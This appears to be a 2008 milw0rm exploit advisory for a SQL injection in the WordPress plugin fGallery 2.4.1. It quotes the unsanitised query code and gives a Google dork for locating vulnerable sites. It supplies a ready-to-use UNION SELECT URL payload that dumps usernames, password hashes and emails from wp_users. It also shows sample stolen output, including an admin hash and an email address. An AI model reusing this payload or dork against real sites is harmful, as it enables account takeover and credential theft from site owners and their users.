@@ -1,0 +1,35 @@
+--------------------------------------------------------------
+        H-T Team [ HouSSaMix + ToXiC350 ] from MoroCCo
+--------------------------------------------------------------
+# Author : Houssamix From H-T Team
+# Script : Wordpress Plugin fGallery 2.4.1                                    
+# Download : http://www.fahlstad.se/wp-plugins/fgallery/                         
+# BUG :  Remote SQL Injection Vulnerability  
+# Dork : inurl:/wp-content/plugins/fgallery/
+
+## Vulnerable CODE :
+~~~~~~~ /wp-content/plugins/fgallery/fim_rss.php ~~~~~~~~~~~~~
+
+$cat = $wpdb->get_row("SELECT * FROM $cats WHERE id = $_GET[album]");
+$images = $wpdb->get_results("SELECT * FROM $imgs WHERE cat = $_GET[album] AND status = 'include'");
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+# Exploit :
+[Target.il]/[wordpress_path]//wp-content/plugins/fgallery/fim_rss.php?album=-1%20union%20select%201,concat(user_login,0x3a,user_pass,0x3a,user_email),3,4,5,6,7%20from%20wp_users--
+
+Exemple :
+http://site.il/wordpress/wp-content/plugins/fgallery/fim_rss.php?album=-1%20union%20select%201,concat(user_login,0x3a,user_pass,0x3a,user_email),3,4,5,6,7%20from%20wp_users--
+
+src='http://site.il/wordpress/wp-content/fgallery/thumb_admin:051e3db4c8eee42d7c93df48dffe4d5f:markus@swimatyourownrisk.com' /><br>5  markus@swimatyourownrisk.com  Thu, 01 Jan 1970 00:00:00 +0100
+
+Info => admin:051e3db4c8eee42d7c93df48dffe4d5f:markus@swimatyourownrisk.com
+
+admin login http://target.il/wordpress_path/wp/wp-login.php
+
+
+# Gr33tz : V40 (Stack-Terrorist) - Mahmood_ali - weliem & all muslims hackers  
+
+------------------------||  Viva Palestine ||------------------------------
+------------------------||  FREE GaZZA ||------------------------------
+
+# milw0rm.com [2008-01-27]
